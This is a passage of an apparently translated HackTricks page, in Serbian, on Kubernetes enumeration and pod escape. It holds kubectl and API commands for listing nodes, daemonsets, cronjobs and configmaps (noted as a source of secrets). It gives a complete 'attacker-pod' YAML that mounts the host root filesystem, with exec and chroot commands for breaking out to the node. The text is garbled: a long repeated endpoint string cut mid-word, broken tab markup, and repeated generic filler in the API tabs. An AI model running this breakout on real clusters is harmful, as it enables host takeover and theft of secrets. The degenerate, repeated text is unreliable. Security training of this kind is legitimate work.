`/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrules
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
### Dobijanje čvorova

Dobijanje svih **čvorova konfigurisanih unutar klastera**.

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %} 

### Enumeracija API-ja

Prilikom testiranja bezbednosti Kubernetes klastera, važno je detaljno istražiti dostupne API-jeve kako biste identifikovali potencijalne ranjivosti. Evo nekoliko tehnika koje možete koristiti za enumeraciju API-ja:

1. **Kubelet API**: Proverite da li je Kubelet API dostupan na portu 10250 ili 10255 na čvorovima klastera. Možete koristiti alat kao što je `kubeletctl` za interakciju sa API-jem.

2. **Kubernetes API server**: Istražite Kubernetes API server koji može biti dostupan na portu 6443 ili drugom portu koji je konfigurisan. Možete koristiti alate poput `kubectl` ili `kubespy` za interakciju sa API-jem.

3. **API endpointi**: Istražite različite API endpointe kao što su `/api`, `/apis`, `/healthz`, `/version`, `/swaggerapi`, `/openapi`, `/metrics`, `/logs`, `/exec`, `/attach`, `/portforward`, `/proxy`, `/run`, `/runningpods`, `/namespaces`, `/pods`, `/nodes`, `/services`, `/deployments`, `/replicasets`, `/jobs`, `/cronjobs`, `/secrets`, `/configmaps`, `/ingresses`, `/persistentvolumes`, `/storageclasses`, `/events`, `/componentstatuses`, `/namespaces/{namespace}/events`, `/apis/{group}/{version}/namespaces/{namespace}/...` i slično.

4. **Autentikacija i autorizacija**: Proverite kako su podešene politike autentikacije i autorizacije za pristup API-jima. Identifikujte moguće slabosti u konfiguraciji autentikacije, dozvola i RBAC pravila.

5. **API tokeni**: Potražite nezaštićene API tokene ili lozinke koje se mogu koristiti za neovlašćen pristup API-jima.

6. **API greške**: Testirajte API-jeve kako biste identifikovali moguće greške ili ranjivosti koje bi mogle biti iskorišćene za napade.

7. **Automatizacija**: Razmislite o korišćenju alata za automatizaciju enumeracije API-ja kako biste efikasno identifikovali potencijalne ranjivosti.

Prilikom enumeracije API-ja, važno je pažljivo dokumentovati sve pronađene informacije i ranjivosti radi dalje analize i ispravki. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
### Dobijanje DaemonSet-ova

**DaeamonSet-ovi** omogućavaju da se osigura da je **određeni pod pokrenut na svim čvorovima** klastera (ili na odabranim). Ako obrišete DaemonSet, podovi koje upravlja takođe će biti uklonjeni.
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %} 

### Enumeracija API-ja

Prilikom testiranja bezbednosti Kubernetes klastera, važno je detaljno istražiti dostupne API-jeve kako biste identifikovali potencijalne ranjivosti i slabe tačke. Evo nekoliko tehnika koje možete koristiti za enumeraciju API-ja:

1. **Kubelet API**: Proverite da li je Kubelet API dostupan i da li je omogućen anonimni pristup.
2. **Kubernetes API server**: Istražite Kubernetes API server kako biste identifikovali dostupne resurse i privilegije.
3. **API endpointi**: Proverite sve dostupne API endpointe i proverite da li postoji mogućnost za neovlašćen pristup ili manipulaciju.

Ove tehnike mogu vam pomoći da bolje razumete kako funkcioniše Kubernetes klaster i da identifikujete potencijalne sigurnosne propuste. 

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
### Dobijanje cronjob-a

Cron poslovi omogućavaju zakazivanje pokretanja poda koji će obaviti neku radnju.
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %} 

### Enumeracija API-ja

Prilikom testiranja bezbednosti Kubernetes klastera, važno je detaljno istražiti dostupne API-jeve kako biste identifikovali potencijalne ranjivosti i slabe tačke. Evo nekoliko tehnika koje možete koristiti za enumeraciju API-ja:

1. **Kubelet API**: Proverite da li je Kubelet API dostupan na čvorovima klastera i istražite mogućnosti za pristup i manipulaciju.

2. **Kubernetes API server**: Istražite Kubernetes API server kako biste identifikovali dostupne resurse, privilegije i moguće ranjivosti.

3. **API endpointi**: Proučite sve dostupne API endpointe kako biste razumeli funkcionalnosti i moguće napade.

4. **Autentikacija i autorizacija**: Ispitajte mehanizme autentikacije i autorizacije API-ja kako biste identifikovali eventualne slabosti.

5. **API tokeni**: Tražite nezaštićene API tokene ili loše konfigurisane pristupne ključeve koji bi mogli omogućiti neovlašćen pristup.

6. **API verzije**: Proverite podržane verzije API-ja i identifikujte potencijalne ranjivosti poznate u starijim verzijama.

Prilikom enumeracije API-ja, važno je pažljivo dokumentovati sve pronađene informacije i potencijalne ranjivosti radi dalje analize i ispravki.

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
### Dobijanje configMap

configMap uvek sadrži mnogo informacija i konfiguracionih datoteka koje pružaju aplikacijama koje se izvršavaju u Kubernetesu. Obično možete pronaći mnogo lozinki, tajni, tokena koji se koriste za povezivanje i proveru drugih internih/eksternih servisa.
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %} 

### Enumeracija API-ja

Prilikom testiranja bezbednosti Kubernetes klastera, važno je detaljno istražiti dostupne API-jeve kako biste identifikovali potencijalne ranjivosti i slabe tačke. Evo nekoliko tehnika koje možete koristiti za enumeraciju API-ja:

1. **Kube-APIserver Endpoints**: Proverite sve dostupne endpointe na kube-apiserveru kako biste identifikovali moguće napade.
2. **Kubelet API**: Istražite kubelet API kako biste pristupili informacijama o čvorovima i njihovim resursima.
3. **API Group Versions**: Proučite dostupne grupe i verzije API-ja kako biste bolje razumeli strukturu i funkcionalnosti.
4. **API Resources**: Identifikujte sve resurse koji su dostupni putem API-ja kako biste razumeli šta je moguće manipulisati.

Ove tehnike mogu vam pomoći da bolje razumete Kubernetes klaster i pronađete potencijalne sigurnosne propuste. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### Dobijanje "svih"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **Dobijanje potrošnje pods**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
### Bekstvo iz poda

Ako ste u mogućnosti da kreirate nove podove, možda ćete moći da pobegnete iz njih do noda. Da biste to uradili, morate kreirati novi pod koristeći yaml fajl, prebaciti se na kreirani pod, a zatim chrootovati u sistem noda. Možete koristiti već postojeće podove kao referencu za yaml fajl jer prikazuju postojeće slike i putanje.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> ako vam je potrebno da kreirate pod na određenom čvoru, možete koristiti sledeću komandu da biste dobili oznake na čvoru
>
> `k get nodes --show-labels`
>
> Uobičajeno, kubernetes.io/hostname i node-role.kubernetes.io/master su sve dobre oznake za izbor.
>
> [reference]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
Nakon toga kreirate pod.
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Sada možete prebaciti na kreirani pod na sledeći način
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
I na kraju se chroot-ujete u sistem čvora
```bash
chroot /root /bin/bash
```
Informacije dobijene sa: [Kubernetes Namespace Breakout using Insecure Host Path Volume — Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Napad i odbrana Kubernetesa: Bust-A-Kube – Epizoda 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Reference

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
